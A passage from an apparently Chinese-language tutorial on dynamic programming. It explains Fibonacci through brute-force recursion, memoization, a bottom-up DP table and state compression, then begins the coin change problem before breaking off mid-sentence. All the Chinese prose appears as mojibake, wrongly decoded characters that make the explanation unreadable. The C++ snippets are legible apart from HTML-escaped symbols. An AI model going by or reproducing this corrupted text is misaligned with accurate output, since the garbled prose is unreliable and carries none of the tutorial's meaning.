çŠ¶æ€2çš„æ‰€æœ‰å–å€¼ï¼š for ... dp[çŠ¶æ€1][çŠ¶æ€2][...] = æ±‚æœ€å€¼(é€‰æ‹©1ï¼Œé€‰æ‹©2...) ä¸‹é¢é€šè¿‡æ–æ³¢é‚£å¥‘æ•°åˆ—é—®é¢˜å’Œå‡‘é›¶é’±é—®é¢˜æ¥è¯¦è§£åŠ¨æ€è§„åˆ’çš„åŸºæœ¬åŸç†ã€‚å‰è€…ä¸»è¦æ˜¯è®©ä½ æ˜ç™½ä»€ä¹ˆæ˜¯é‡å å­é—®é¢˜ï¼ˆæ–æ³¢é‚£å¥‘æ•°åˆ—æ²¡æœ‰æ±‚æœ€å€¼ï¼Œæ‰€ä»¥ä¸¥æ ¼æ¥è¯´ä¸æ˜¯åŠ¨æ€è§„åˆ’é—®é¢˜ï¼‰ï¼Œåè€…ä¸»è¦ä¸¾é›†ä¸­äºå¦‚ä½•åˆ—å‡ºçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚ ä¸€ã€æ–æ³¢é‚£å¥‘æ•°åˆ—è¯·è¯»è€…ä¸è¦å«Œå¼ƒè¿™ä¸ªä¾‹å­ç®€å•ï¼Œåªæœ‰ç®€å•çš„ä¾‹å­æ‰èƒ½è®©ä½ æŠŠç²¾åŠ›å……åˆ†é›†ä¸­åœ¨ç®—æ³•èƒŒåçš„é€šç”¨æ€æƒ³å’ŒæŠ€å·§ä¸Šï¼Œè€Œä¸ä¼šè¢«é‚£äº›éšæ™¦çš„ç»†èŠ‚é—®é¢˜æçš„è«åå…¶å¦™ã€‚æƒ³è¦å›°éš¾çš„ä¾‹å­ï¼Œå†å²æ–‡ç« é‡Œæœ‰çš„æ˜¯ã€‚ 1ã€æš´åŠ›é€’å½’ æ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ•°å­¦å½¢å¼å°±æ˜¯é€’å½’çš„ï¼Œå†™æˆä»£ç å°±æ˜¯è¿™æ ·ï¼š int fib(int N) { if (N == 1 || N == 2) return 1; return fib(N - 1) + fib(N - 2); } PSï¼šä½†å‡¡é‡åˆ°éœ€è¦é€’å½’çš„é—®é¢˜ï¼Œæœ€å¥½éƒ½ç”»å‡ºé€’å½’æ ‘ï¼Œè¿™å¯¹ä½ åˆ†æç®—æ³•çš„å¤æ‚åº¦ï¼Œå¯»æ‰¾ç®—æ³•ä½æ•ˆçš„åŸå› éƒ½æœ‰å·¨å¤§å¸®åŠ©ã€‚ è¿™ä¸ªé€’å½’æ ‘æ€ä¹ˆç†è§£ï¼Ÿå°±æ˜¯è¯´æƒ³è¦è®¡ç®—åŸé—®é¢˜ f(20)ï¼Œæˆ‘å°±å¾—å…ˆè®¡ç®—å‡ºå­é—®é¢˜ f(19) å’Œ f(18)ï¼Œç„¶åè¦è®¡ç®— f(19)ï¼Œæˆ‘å°±è¦å…ˆç®—å‡ºå­é—®é¢˜ f(18) å’Œ f(17)ï¼Œä»¥æ­¤ç±»æ¨ã€‚æœ€åé‡åˆ° f(1) æˆ–è€… f(2) çš„æ—¶å€™ï¼Œç»“æœå·²çŸ¥ï¼Œå°±èƒ½ç›´æ¥è¿”å›ç»“æœï¼Œé€’å½’æ ‘ä¸å†å‘ä¸‹ç”Ÿé•¿äº†ã€‚ é€’å½’ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ€ä¹ˆè®¡ç®—ï¼Ÿå°±æ˜¯ç”¨å­é—®é¢˜ä¸ªæ•°ä¹˜ä»¥è§£å†³ä¸€ä¸ªå­é—®é¢˜éœ€è¦çš„æ—¶é—´ã€‚ é¦–å…ˆè®¡ç®—å­é—®é¢˜ä¸ªæ•°ï¼Œå³é€’å½’æ ‘ä¸­èŠ‚ç‚¹çš„æ€»æ•°ã€‚æ˜¾ç„¶äºŒå‰æ ‘èŠ‚ç‚¹æ€»æ•°ä¸ºæŒ‡æ•°çº§åˆ«ï¼Œæ‰€ä»¥å­é—®é¢˜ä¸ªæ•°ä¸º O(2^n)ã€‚ ç„¶åè®¡ç®—è§£å†³ä¸€ä¸ªå­é—®é¢˜çš„æ—¶é—´ï¼Œåœ¨æœ¬ç®—æ³•ä¸­ï¼Œæ²¡æœ‰å¾ªç¯ï¼Œåªæœ‰ f(n - 1) + f(n - 2) ä¸€ä¸ªåŠ æ³•æ“ä½œï¼Œæ—¶é—´ä¸º O(1)ã€‚ æ‰€ä»¥ï¼Œè¿™ä¸ªç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ä¸ºäºŒè€…ç›¸ä¹˜ï¼Œå³ O(2^n)ï¼ŒæŒ‡æ•°çº§åˆ«ï¼Œçˆ†ç‚¸ã€‚ è§‚å¯Ÿé€’å½’æ ‘ï¼Œå¾ˆæ˜æ˜¾å‘ç°äº†ç®—æ³•ä½æ•ˆçš„åŸå› ï¼šå­˜åœ¨å¤§é‡é‡å¤è®¡ç®—ï¼Œæ¯”å¦‚ f(18) è¢«è®¡ç®—äº†ä¸¤æ¬¡ï¼Œè€Œä¸”ä½ å¯ä»¥çœ‹åˆ°ï¼Œä»¥ f(18) ä¸ºæ ¹çš„è¿™ä¸ªé€’å½’æ ‘ä½“é‡å·¨å¤§ï¼Œå¤šç®—ä¸€éï¼Œä¼šè€—è´¹å·¨å¤§çš„æ—¶é—´ã€‚æ›´ä½•å†µï¼Œè¿˜ä¸æ­¢ f(18) è¿™ä¸€ä¸ªèŠ‚ç‚¹è¢«é‡å¤è®¡ç®—ï¼Œæ‰€ä»¥è¿™ä¸ªç®—æ³•åŠå…¶ä½æ•ˆã€‚ è¿™å°±æ˜¯åŠ¨æ€è§„åˆ’é—®é¢˜çš„ç¬¬ä¸€ä¸ªæ€§è´¨ï¼šé‡å å­é—®é¢˜ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬æƒ³åŠæ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 2ã€å¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³• æ˜ç¡®äº†é—®é¢˜ï¼Œå…¶å®å°±å·²ç»æŠŠé—®é¢˜è§£å†³äº†ä¸€åŠã€‚å³ç„¶è€—æ—¶çš„åŸå› æ˜¯é‡å¤è®¡ç®—ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€ ä¸€ä¸ªã€Œå¤‡å¿˜å½•ã€ï¼Œæ¯æ¬¡ç®—å‡ºæŸä¸ªå­é—®é¢˜çš„ç­”æ¡ˆååˆ«æ€¥ç€è¿”å›ï¼Œå…ˆè®°åˆ°ã€Œå¤‡å¿˜å½•ã€é‡Œå†è¿”å›ï¼›æ¯æ¬¡é‡åˆ°ä¸€ä¸ªå­é—®é¢˜å…ˆå»ã€Œå¤‡å¿˜å½•ã€é‡ŒæŸ¥ä¸€æŸ¥ï¼Œå¦‚æœå‘ç°ä¹‹å‰å·²ç»è§£å†³è¿‡è¿™ä¸ªé—®é¢˜äº†ï¼Œç›´æ¥æŠŠç­”æ¡ˆæ‹¿å‡ºæ¥ç”¨ï¼Œä¸è¦å†è€—æ—¶å»è®¡ç®—äº†ã€‚ ä¸€èˆ¬ä½¿ç”¨ä¸€ä¸ªæ•°ç»„å……å½“è¿™ä¸ªã€Œå¤‡å¿˜å½•ã€ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨ï¼ˆå­—å…¸ï¼‰ï¼Œæ€æƒ³éƒ½æ˜¯ä¸€æ ·çš„ã€‚ int fib(int N) { if (N &lt; 1) return 0; // å¤‡å¿˜å½•å…¨åˆå§‹åŒ–ä¸º 0 vector&lt;int&gt; memo(N + 1, 0); // è¿›è¡Œå¸¦å¤‡å¿˜å½•çš„é€’å½’ return helper(memo, N); } int helper(vector&lt;int&gt;&amp; memo, int n) { // base case if (n == 1 || n == 2) return 1; // å·²ç»è®¡ç®—è¿‡ if (memo[n] != 0) return memo[n]; memo[n] = helper(memo, n - 1) + helper(memo, n - 2); return memo[n]; } ç°åœ¨ï¼Œç”»å‡ºé€’å½’æ ‘ï¼Œä½ å°±çŸ¥é“ã€Œå¤‡å¿˜å½•ã€åˆ°åº•åšäº†ä»€ä¹ˆã€‚ img å®é™…ä¸Šï¼Œå¸¦ã€Œå¤‡å¿˜å½•ã€çš„é€’å½’ç®—æ³•ï¼ŒæŠŠä¸€æ£µå­˜åœ¨å·¨é‡å†—ä½™çš„é€’å½’æ ‘é€šè¿‡ã€Œå‰ªæã€ï¼Œæ”¹é€ æˆäº†ä¸€å¹…ä¸å­˜åœ¨å†—ä½™çš„é€’å½’å›¾ï¼Œæå¤§å‡å°‘äº†å­é—®é¢˜ï¼ˆå³é€’å½’å›¾ä¸­èŠ‚ç‚¹ï¼‰çš„ä¸ªæ•°ã€‚ img é€’å½’ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ€ä¹ˆè®¡ç®—ï¼Ÿå°±æ˜¯ç”¨å­é—®é¢˜ä¸ªæ•°ä¹˜ä»¥è§£å†³ä¸€ä¸ªå­é—®é¢˜éœ€è¦çš„æ—¶é—´ã€‚ å­é—®é¢˜ä¸ªæ•°ï¼Œå³å›¾ä¸­èŠ‚ç‚¹çš„æ€»æ•°ï¼Œç”±äºæœ¬ç®—æ³•ä¸å­˜åœ¨å†—ä½™è®¡ç®—ï¼Œå­é—®é¢˜å°±æ˜¯ f(1), f(2), f(3) â€¦ f(20)ï¼Œæ•°é‡å’Œè¾“å…¥è§„æ¨¡ n = 20 æˆæ­£æ¯”ï¼Œæ‰€ä»¥å­é—®é¢˜ä¸ªæ•°ä¸º O(n)ã€‚ è§£å†³ä¸€ä¸ªå­é—®é¢˜çš„æ—¶é—´ï¼ŒåŒä¸Šï¼Œæ²¡æœ‰ä»€ä¹ˆå¾ªç¯ï¼Œæ—¶é—´ä¸º O(1)ã€‚ æ‰€ä»¥ï¼Œæœ¬ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚æ¯”èµ·æš´åŠ›ç®—æ³•ï¼Œæ˜¯é™ç»´æ‰“å‡»ã€‚ è‡³æ­¤ï¼Œå¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•çš„æ•ˆç‡å·²ç»å’Œè¿­ä»£çš„åŠ¨æ€è§„åˆ’è§£æ³•ä¸€æ ·äº†ã€‚å®é™…ä¸Šï¼Œè¿™ç§è§£æ³•å’Œè¿­ä»£çš„åŠ¨æ€è§„åˆ’å·²ç»å·®ä¸å¤šäº†ï¼Œåªä¸è¿‡è¿™ç§æ–¹æ³•å«åšã€Œè‡ªé¡¶å‘ä¸‹ã€ï¼ŒåŠ¨æ€è§„åˆ’å«åšã€Œè‡ªåº•å‘ä¸Šã€ã€‚ å•¥å«ã€Œè‡ªé¡¶å‘ä¸‹ã€ï¼Ÿæ³¨æ„æˆ‘ä»¬åˆšæ‰ç”»çš„é€’å½’æ ‘ï¼ˆæˆ–è€…è¯´å›¾ï¼‰ï¼Œæ˜¯ä»ä¸Šå‘ä¸‹å»¶ä¼¸ï¼Œéƒ½æ˜¯ä»ä¸€ä¸ªè§„æ¨¡è¾ƒå¤§çš„åŸé—®é¢˜æ¯”å¦‚è¯´ f(20)ï¼Œå‘ä¸‹é€æ¸åˆ†è§£è§„æ¨¡ï¼Œç›´åˆ° f(1) å’Œ f(2) è¿™ä¸¤ä¸ª base caseï¼Œç„¶åé€å±‚è¿”å›ç­”æ¡ˆï¼Œè¿™å°±å«ã€Œè‡ªé¡¶å‘ä¸‹ã€ã€‚ å•¥å«ã€Œè‡ªåº•å‘ä¸Šã€ï¼Ÿåè¿‡æ¥ï¼Œæˆ‘ä»¬ç›´æ¥ä»æœ€åº•ä¸‹ï¼Œæœ€ç®€å•ï¼Œé—®é¢˜è§„æ¨¡æœ€å°çš„ f(1) å’Œ f(2) å¼€å§‹å¾€ä¸Šæ¨ï¼Œç›´åˆ°æ¨åˆ°æˆ‘ä»¬æƒ³è¦çš„ç­”æ¡ˆ f(20)ï¼Œè¿™å°±æ˜¯åŠ¨æ€è§„åˆ’çš„æ€è·¯ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåŠ¨æ€è§„åˆ’ä¸€èˆ¬éƒ½è„±ç¦»äº†é€’å½’ï¼Œè€Œæ˜¯ç”±å¾ªç¯è¿­ä»£å®Œæˆè®¡ç®—ã€‚ 3ã€dp æ•°ç»„çš„è¿­ä»£è§£æ³• æœ‰äº†ä¸Šä¸€æ­¥ã€Œå¤‡å¿˜å½•ã€çš„å¯å‘ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªã€Œå¤‡å¿˜å½•ã€ç‹¬ç«‹å‡ºæ¥æˆä¸ºä¸€å¼ è¡¨ï¼Œå°±å«åš DP table å§ï¼Œåœ¨è¿™å¼ è¡¨ä¸Šå®Œæˆã€Œè‡ªåº•å‘ä¸Šã€çš„æ¨ç®—å²‚ä¸ç¾å“‰ï¼ int fib(int N) { if (N &lt; 1) return 0; if (N == 1 || N == 2) return 1; vector&lt;int&gt; dp(N + 1, 0); // base case dp[1] = dp[2] = 1; for (int i = 3; i &lt;= N; i++) dp[i] = dp[i - 1] + dp[i - 2]; return dp[N]; } img ç”»ä¸ªå›¾å°±å¾ˆå¥½ç†è§£äº†ï¼Œè€Œä¸”ä½ å‘ç°è¿™ä¸ª DP table ç‰¹åˆ«åƒä¹‹å‰é‚£ä¸ªã€Œå‰ªæã€åçš„ç»“æœï¼Œåªæ˜¯åè¿‡æ¥ç®—è€Œå·²ã€‚å®é™…ä¸Šï¼Œå¸¦å¤‡å¿˜å½•çš„é€’å½’è§£æ³•ä¸­çš„ã€Œå¤‡å¿˜å½•ã€ï¼Œæœ€ç»ˆå®Œæˆåå°±æ˜¯è¿™ä¸ª DP tableï¼Œæ‰€ä»¥è¯´è¿™ä¸¤ç§è§£æ³•å…¶å®æ˜¯å·®ä¸å¤šçš„ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæ•ˆç‡ä¹ŸåŸºæœ¬ç›¸åŒã€‚ è¿™é‡Œï¼Œå¼•å‡ºã€ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€è¿™ä¸ªåè¯ï¼Œå®é™…ä¸Šå°±æ˜¯æè¿°é—®é¢˜ç»“æ„çš„æ•°å­¦å½¢å¼ï¼š img ä¸ºå•¥å«ã€ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€ï¼Ÿå…¶å®å°±æ˜¯ä¸ºäº†å¬èµ·æ¥é«˜ç«¯ã€‚ä½ æŠŠ f(n) æƒ³åšä¸€ä¸ªçŠ¶æ€ nï¼Œè¿™ä¸ªçŠ¶æ€ n æ˜¯ç”±çŠ¶æ€ n - 1 å’ŒçŠ¶æ€ n - 2 ç›¸åŠ è½¬ç§»è€Œæ¥ï¼Œè¿™å°±å«çŠ¶æ€è½¬ç§»ï¼Œä»…æ­¤è€Œå·²ã€‚ ä½ ä¼šå‘ç°ï¼Œä¸Šé¢çš„å‡ ç§è§£æ³•ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œä¾‹å¦‚ return f(n - 1) + f(n - 2)ï¼Œdp[i] = dp[i - 1] + dp[i - 2]ï¼Œä»¥åŠå¯¹å¤‡å¿˜å½•æˆ– DP table çš„åˆå§‹åŒ–æ“ä½œï¼Œéƒ½æ˜¯å›´ç»•è¿™ä¸ªæ–¹ç¨‹å¼çš„ä¸åŒè¡¨ç°å½¢å¼ã€‚å¯è§åˆ—å‡ºã€ŒçŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€çš„é‡è¦æ€§ï¼Œå®ƒæ˜¯è§£å†³é—®é¢˜çš„æ ¸å¿ƒã€‚è€Œä¸”å¾ˆå®¹æ˜“å‘ç°ï¼Œå…¶å®çŠ¶æ€è½¬ç§»æ–¹ç¨‹ç›´æ¥ä»£è¡¨ç€æš´åŠ›è§£æ³•ã€‚ åƒä¸‡ä¸è¦çœ‹ä¸èµ·æš´åŠ›è§£ï¼ŒåŠ¨æ€è§„åˆ’é—®é¢˜æœ€å›°éš¾çš„å°±æ˜¯å†™å‡ºè¿™ä¸ªæš´åŠ›è§£ï¼Œå³çŠ¶æ€è½¬ç§»æ–¹ç¨‹ã€‚åªè¦å†™å‡ºæš´åŠ›è§£ï¼Œä¼˜åŒ–æ–¹æ³•æ— éæ˜¯ç”¨å¤‡å¿˜å½•æˆ–è€… DP tableï¼Œå†æ— å¥¥å¦™å¯è¨€ã€‚ è¿™ä¸ªä¾‹å­çš„æœ€åï¼Œè®²ä¸€ä¸ªç»†èŠ‚ä¼˜åŒ–ã€‚ç»†å¿ƒçš„è¯»è€…ä¼šå‘ç°ï¼Œæ ¹æ®æ–æ³¢é‚£å¥‘æ•°åˆ—çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Œå½“å‰çŠ¶æ€åªå’Œä¹‹å‰çš„ä¸¤ä¸ªçŠ¶æ€æœ‰å…³ï¼Œå…¶å®å¹¶ä¸éœ€è¦é‚£ä¹ˆé•¿çš„ä¸€ä¸ª DP table æ¥å­˜å‚¨æ‰€æœ‰çš„çŠ¶æ€ï¼Œåªè¦æƒ³åŠæ³•å­˜å‚¨ä¹‹å‰çš„ä¸¤ä¸ªçŠ¶æ€å°±è¡Œäº†ã€‚æ‰€ä»¥ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä¼˜åŒ–ï¼ŒæŠŠç©ºé—´å¤æ‚åº¦é™ä¸º O(1)ï¼š int fib(int n) { if (n &lt; 1) return 0; if (n == 2 || n == 1) return 1; int prev = 1, curr = 1; for (int i = 3; i &lt;= n; i++) { int sum = prev + curr; prev = curr; curr = sum; } return curr; } è¿™ä¸ªæŠ€å·§å°±æ˜¯æ‰€è°“çš„ã€ŒçŠ¶æ€å‹ç¼©ã€ï¼Œå¦‚æœæˆ‘ä»¬å‘ç°æ¯æ¬¡çŠ¶æ€è½¬ç§»åªéœ€è¦ DP table ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•ç”¨çŠ¶æ€å‹ç¼©æ¥ç¼©å° DP table çš„å¤§å°ï¼Œåªè®°å½•å¿…è¦çš„æ•°æ®ï¼Œä¸Šè¿°ä¾‹å­å°±ç›¸å½“äºæŠŠDP table çš„å¤§å°ä» n ç¼©å°åˆ° 2ã€‚åç»­çš„åŠ¨æ€è§„åˆ’ç« èŠ‚ä¸­æˆ‘ä»¬è¿˜ä¼šçœ‹åˆ°è¿™æ ·çš„ä¾‹å­ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯æŠŠä¸€ä¸ªäºŒç»´çš„ DP table å‹ç¼©æˆä¸€ç»´ï¼Œå³æŠŠç©ºé—´å¤æ‚åº¦ä» O(n^2) å‹ç¼©åˆ° O(n)ã€‚ æœ‰äººä¼šé—®ï¼ŒåŠ¨æ€è§„åˆ’çš„å¦ä¸€ä¸ªé‡è¦ç‰¹æ€§ã€Œæœ€ä¼˜å­ç»“æ„ã€ï¼Œæ€ä¹ˆæ²¡æœ‰æ¶‰åŠï¼Ÿä¸‹é¢ä¼šæ¶‰åŠã€‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ä¾‹å­ä¸¥æ ¼æ¥è¯´ä¸ç®—åŠ¨æ€è§„åˆ’ï¼Œå› ä¸ºæ²¡æœ‰æ¶‰åŠæ±‚æœ€å€¼ï¼Œä»¥ä¸Šæ—¨åœ¨è¯´æ˜é‡å å­é—®é¢˜çš„æ¶ˆé™¤æ–¹æ³•ï¼Œæ¼”ç¤ºå¾—åˆ°æœ€ä¼˜è§£æ³•é€æ­¥æ±‚ç²¾çš„è¿‡ç¨‹ã€‚ä¸‹é¢ï¼Œçœ‹ç¬¬äºŒä¸ªä¾‹å­ï¼Œå‡‘é›¶é’±é—®é¢˜ã€‚ äºŒã€å‡‘é›¶é’±é—®é¢˜å…ˆçœ‹ä¸‹é¢˜ç›®ï¼šç»™ä½  k ç§é¢å€¼çš„ç¡¬å¸ï¼Œé¢å€¼åˆ†åˆ«ä¸º c1, c2 ... ckï¼Œæ¯ç§ç¡¬å¸çš„æ•°é‡æ— é™ï¼Œå†ç»™ä¸€ä¸ªæ€»é‡‘é¢ amountï¼Œé—®ä½ æœ€å°‘éœ€è¦å‡ æšç¡¬å¸å‡‘å‡ºè¿™ä¸ªé‡‘é¢ï¼Œå¦‚æœä¸å¯èƒ½å‡‘å‡ºï¼Œç®—æ³•è¿”å› -1 ã€‚ç®—æ³•çš„å‡½æ•°ç­¾åå¦‚ä¸‹ï¼š // coins ä¸­æ˜¯å¯é€‰ç¡¬å¸é¢å€¼ï¼Œamount æ˜¯ç›®æ ‡é‡‘é¢ int coinChange(int[] coins, int amount); æ¯”å¦‚è¯´ k = 3ï¼Œé¢å€¼åˆ†åˆ«ä¸º 1ï¼Œ2ï¼Œ5ï¼Œæ€»é‡‘é¢ amount = 11ã€‚é‚£ä¹ˆæœ€å°‘éœ€è¦ 3 æšç¡¬å¸å‡‘å‡ºï¼Œå³ 11 = 5 + 5 + 1ã€‚ ä½ è®¤ä¸ºè®¡ç®—æœºåº”è¯¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿæ˜¾ç„¶ï¼Œå°±æ˜¯æŠŠæ‰€æœ‰å¯èƒ½çš„å‡‘ç¡¬å¸æ–¹æ³•éƒ½ç©·ä¸¾å‡ºæ¥ï¼Œç„¶åæ‰¾æ‰¾çœ‹æœ€å°‘éœ€è¦å¤šå°‘æšç¡¬å¸ã€‚ 1ã€æš´åŠ›é€’å½’ é¦–å…ˆï¼Œè¿™ä¸ªé—®é¢˜æ˜¯åŠ¨æ€è§„åˆ’é—®é¢˜ï¼Œå› ä¸ºå®ƒå…·æœ‰ã€Œæœ€ä¼˜å­ç»“æ„ã€çš„ã€‚è¦ç¬¦åˆã€Œæœ€ä¼˜å­ç»“æ„ã€ï¼Œå­é—®é¢˜é—´å¿…é¡»äº’ç›¸ç‹¬ç«‹ã€‚å•¥å«ç›¸äº’ç‹¬ç«‹ï¼Ÿä½ è‚¯å®šä¸æƒ³çœ‹æ•°å­¦è¯æ˜ï¼Œæˆ‘ç”¨ä¸€ä¸ªç›´è§‚çš„ä¾‹å­æ¥è®²è§£ã€‚ æ¯”å¦‚è¯´ï¼Œå‡è®¾ä½ è€ƒè¯•ï¼Œæ¯é—¨ç§‘ç›®çš„æˆç»©éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„ã€‚ä½ çš„åŸé—®é¢˜æ˜¯è€ƒå‡ºæœ€é«˜çš„æ€»æˆç»©ï¼Œé‚£ä¹ˆä½ çš„å­é—®é¢˜å°±æ˜¯è¦æŠŠè¯­æ–‡è€ƒåˆ°æœ€é«˜ï¼Œæ•°å­¦è€ƒåˆ°æœ€é«˜â€¦â€¦ ä¸ºäº†æ¯é—¨è¯¾è€ƒåˆ°æœ€é«˜ï¼Œä½ è¦æŠŠæ¯é—¨è¯¾ç›¸åº”çš„é€‰æ‹©é¢˜åˆ†æ•°æ‹¿åˆ°æœ€é«˜ï¼Œå¡«ç©ºé¢˜åˆ†æ•°æ‹¿åˆ°æœ€é«˜â€¦â€¦ å½“ç„¶ï¼Œæœ€ç»ˆå°±æ˜¯ä½ æ¯é—¨è¯¾éƒ½æ˜¯æ»¡åˆ†ï¼Œè¿™å°±æ˜¯æœ€é«˜çš„æ€»æˆç»©ã€‚ å¾—åˆ°äº†æ­£ç¡®çš„ç»“æœï¼šæœ€é«˜çš„æ€»æˆç»©å°±æ˜¯æ€»åˆ†ã€‚å› ä¸ºè¿™ä¸ªè¿‡ç¨‹ç¬¦åˆæœ€ä¼˜å­ç»“æ„ï¼Œâ€œæ¯é—¨ç§‘ç›®è€ƒåˆ°æœ€é«˜â€è¿™äº›å­é—®é¢˜æ˜¯äº’ç›¸ç‹¬ç«‹ï¼Œäº’ä¸å¹²æ‰°çš„ã€‚ ä½†æ˜¯ï¼Œå¦‚æœåŠ ä¸€ä¸ªæ¡ä»¶ï¼šä½ çš„è¯­æ–‡æˆç»©å’Œæ•°å­¦æˆç»©ä¼šäº’ç›¸åˆ¶çº¦ï¼Œæ•°å­¦åˆ†æ•°é«˜ï¼Œè¯­æ–‡åˆ†æ•°å°±ä¼šé™ä½ï¼Œåä¹‹äº¦ç„¶ã€‚è¿™æ ·çš„è¯ï¼Œæ˜¾ç„¶ä½ èƒ½è€ƒåˆ°çš„æœ€é«˜æ€»æˆç»©å°±è¾¾ä¸åˆ°æ€»åˆ†äº†ï¼ŒæŒ‰åˆšæ‰é‚£ä¸ªæ€è·¯å°±ä¼šå¾—åˆ°é”™è¯¯çš„ç»“æœã€‚å› ä¸ºå­é—®é¢˜å¹¶ä¸ç‹¬ç«‹ï¼Œè¯­æ–‡æ•°å­¦æˆç»©æ— æ³•åŒæ—¶æœ€ä¼˜ï¼Œæ‰€ä»¥æœ€ä¼˜å­ç»“æ„è¢«ç ´åã€‚ å›åˆ°å‡‘é›¶é’±é—®é¢˜ï¼Œä¸ºä»€ä¹ˆè¯´å®ƒç¬¦åˆæœ€ä¼˜å­ç»“æ„å‘¢ï¼Ÿæ¯”å¦‚ä½ æƒ³æ±‚ amount = 11 æ—¶çš„æœ€å°‘ç¡¬å¸æ•°ï¼ˆåŸé—®é¢˜ï¼‰ï¼Œå¦‚æœä½ çŸ¥é“å‡‘å‡º amount = 10 çš„æœ€å°‘ç¡¬å¸æ•°ï¼ˆå­é—®é¢˜ï¼‰ï¼Œä½ åªéœ€è¦æŠŠå­é—®é¢˜çš„ç­”æ¡ˆåŠ ä¸€ï¼ˆå†é€‰ä¸€æšé¢å€¼ä¸º 1 çš„ç¡¬å¸ï¼‰å°±æ˜¯åŸé—®é¢˜çš„ç­”æ¡ˆã€‚å› ä¸ºç¡¬å¸çš„æ•°é‡æ˜¯æ²¡æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥å­é—®é¢˜ä¹‹é—´æ²¡æœ‰ç›¸äº’åˆ¶ï¼Œæ˜¯äº’ç›¸ç‹¬ç«‹çš„ã€‚ PSï¼šå…³äºæœ€ä¼˜å­ç»“æ„çš„é—®é¢˜ï¼Œåæ–‡åŠ¨æ€è§„åˆ’ç­”ç–‘ç¯‡ è¿˜ä¼šå†ä¸¾ä¾‹æ¢è®¨ã€‚ é‚£ä¹ˆï¼Œæ—¢ç„¶çŸ¥é“äº†è¿™æ˜¯ä¸ªåŠ¨æ€è§„åˆ’é—®é¢˜ï¼Œå°±è¦æ€è€ƒå¦‚ä½•åˆ—å‡ºæ­£ç¡®çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼Ÿ 1ã€ç¡®å®š base caseï¼Œè¿™ä¸ªå¾ˆç®€å•ï¼Œæ˜¾ç„¶ç›®æ ‡é‡‘é¢ amount ä¸º 0 æ—¶ç®—æ³•è¿”å› 0ï¼Œå› ä¸ºä¸éœ€è¦ä»»ä½•ç¡¬å¸å°±å·²ç»å‡‘å‡ºç›®æ ‡é‡‘é¢äº†ã€‚ 2ã€ç¡®å®šã€ŒçŠ¶æ€ã€ï¼Œä¹Ÿå°±æ˜¯åŸé—®é¢˜å’Œå­é—®é¢˜ä¸­ä¼šå˜åŒ–çš„å˜é‡ã€‚ç”±äºç¡¬å¸æ•°é‡æ— é™ï¼Œç¡¬å¸çš„é¢é¢ä¹Ÿæ˜¯é¢˜ç›®ç»™å®šçš„ï¼Œåªæœ‰ç›®æ ‡é‡‘é¢ä¼šä¸æ–­åœ°å‘ base case é è¿‘ï¼Œæ‰€ä»¥å”¯ä¸€çš„ã€ŒçŠ¶æ€ã€å°±æ˜¯ç›®æ ‡é‡‘é¢ amountã€‚ 3ã€ç¡®å®šã€Œé€‰æ‹©ã€ï¼Œä¹Ÿå°±æ˜¯å¯¼è‡´ã€ŒçŠ¶æ€ã€äº§ç”Ÿå˜åŒ–çš„è¡Œä¸ºã€‚ç›®æ ‡é‡‘é¢ä¸ºä»€ä¹ˆå˜åŒ–å‘¢ï¼Œå› ä¸ºä½ åœ¨é€‰æ‹©ç¡¬å¸ï¼Œä½ æ¯é€‰æ‹©ä¸€æšç¡¬å¸ï¼Œå°±ç›¸å½“äºå‡å°‘äº†ç›®æ ‡é‡‘é¢ã€‚æ‰€ä»¥è¯´æ‰€æœ‰ç¡¬å¸çš„é¢å€¼ï¼Œå°±æ˜¯ä½ çš„ã€Œé€‰æ‹©ã€ã€‚ 4ã€æ˜ç¡® dp å‡½æ•°/æ•°ç»„çš„å®šä¹‰ã€‚æˆ‘ä»¬è¿™é‡Œè®²çš„æ˜¯è‡ªé¡¶å‘ä¸‹çš„è§£æ³•ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸€ä¸ªé€’å½’çš„ dp å‡½æ•°ï¼Œä¸€èˆ¬æ¥è¯´å‡½æ•°çš„å‚æ•°å°±æ˜¯çŠ¶æ€è½¬ç§»ä¸­ä¼šå˜åŒ–çš„é‡ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´åˆ°çš„ã€ŒçŠ¶æ€ã€ï¼›å‡½æ•°çš„è¿”å›å€¼å°±æ˜¯é¢˜ç›®è¦æ±‚æˆ‘ä»¬è®¡ç®—çš„é‡ã€‚å°±æœ¬é¢˜æ¥è¯´ï¼ŒçŠ¶æ€åªæœ‰ä¸€ä¸ªï¼Œå³ã€Œç›®æ ‡é‡‘é¢ã€ï¼Œé¢˜ç›®è¦æ±‚æˆ‘ä»¬è®¡ç®—å‡‘å‡ºç›®æ ‡é‡‘é¢æ‰€éœ€çš„æœ€å°‘ç¡¬å¸æ•°é‡ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å®šä¹‰ dp 